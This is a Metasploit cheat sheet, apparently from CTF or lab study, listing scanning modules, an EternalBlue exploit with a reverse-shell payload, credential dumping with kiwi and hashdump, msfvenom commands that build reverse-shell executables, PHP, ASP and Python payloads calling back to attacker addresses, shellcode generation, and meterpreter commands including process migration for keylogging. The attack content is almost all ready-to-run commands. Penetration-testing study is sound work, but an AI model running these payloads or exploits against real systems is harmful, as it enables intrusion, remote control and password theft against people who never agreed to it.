# Metasploit

> Shahrukh Tramboo | February 3rd, 2022

--------------------------------------

**Scanning**

1.	Port Scanning:

```bash
search portscan
```

2.	UDP service Identification:

The
```bash
scanner/discovery/udp_sweep
```
module will allow you to quickly identify services running over the UDP (User Datagram Protocol).

3.	SMB Scans:

Especially useful in a corporate network would be 

```bash
scanner/smb/smb_enumshares 
```
and
```bash
scanner/smb/smb_version
```

---------------------------------------------

**Exploitation**

For this service: Windows 7 Professional 7601 Service Pack 1 x64 (64-bit), Use this exploit:windows/smb/ms17_010_eternalblue with this payload:generic/shell_reverse_tcp.

Metasploit payloads can be initially divided into two categories; inline (also called single) and staged.
staged payloads are sent to the target in two steps.
An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size.
The inline payloads are sent in a single step.

---------------------------------------------


**Post Exploitation**

Metasploit offers Mimikatz and Kiwi extensions to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more.

Windows
```bash
meterpreter> load kiwi
creds_all
hashdump
```

Linux
```bash
msf6> use post/linux/gather/hashdump
```

Windows
```bash
msf6> use post/windows/gather/enum_shares
```


------------------------------------------------

**MSFVenom**

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.

Encoders:

The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```
------------------------------------------------------

**Meterpreter Payload**

Linux Executable and Linkable Format (elf)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
````

Windows
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

ASP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

Python
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

Meterpreter payloads are also divided into stagged and inline versions. However, Meterpreter has a wide range of different versions you can choose from based on your target system. 

```bash
msfvenom --list payloads | grep meterpreter
```

**Generate shellcode for windows**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -b "\x00\x0a" -f python -v payload
```

---------------------------------------------------------

**Meterpreter Commands**

background:	 	Backgrounds the current session
exit:	 		Terminate the Meterpreter session
guid:	 		Get the session GUID (Globally Unique Identifier)
help:	 		Displays the help menu
info:	 		Displays information about a Post module
irb:	 		Opens an interactive Ruby shell on the current session
load:	 		Loads one or more Meterpreter extensions
migrate:	 	Allows you to migrate Meterpreter to another process
run:	 		Executes a Meterpreter script or Post module
sessions:	 	Quickly switch to another session

use help cpmmand to get more

getuid:	The getuid command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)

ps:	The ps command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.

migrate: Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process.
Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.
```bash
migrate 716
```

Hashdump: The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

Search:	The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, 

Shell: The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.

----------------------------------------------------------




